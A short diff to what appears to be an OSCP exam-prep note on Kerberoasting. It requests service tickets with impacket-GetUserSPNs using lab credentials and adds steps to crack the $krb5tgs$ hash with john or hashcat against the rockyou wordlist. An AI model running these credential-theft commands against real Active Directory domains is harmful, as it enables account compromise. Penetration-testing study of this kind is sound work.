@@ -42,11 +42,17 @@ dv.paragraph("```bash\n" + command + "\n```");
 impacket-GetUserSPNs 'oscp.exam/Eric.Wallows:Password' -dc-ip 10.10.162.152 -request
 ```
 
+Paste the entire hash including $krb5tgs$23$ into hash.txt
 ```
 john -w=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
+or
+```
+hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt
+```
 
+If no results = password is not in the wordlist
 #### 1. 🖥️ Enumerate SPNs (Windows - PowerView)
 ```
 # Load PowerView
